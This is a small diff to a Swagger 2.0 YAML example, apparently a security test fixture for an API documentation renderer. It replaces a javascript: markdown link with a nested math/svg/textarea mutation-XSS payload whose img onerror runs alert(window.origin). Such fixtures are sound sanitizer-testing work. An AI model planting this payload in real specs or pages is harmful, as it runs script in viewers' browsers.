@@ -1,8 +1,8 @@
 swagger: '2.0'
 info:
   title: Example yaml.spec
-  description: This is an example text **HELLO FROM MARKDOWN** [Abrir o Google](javascript:alert`1`)
-
+  description: |
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
 paths:
   /accounts:
     get:
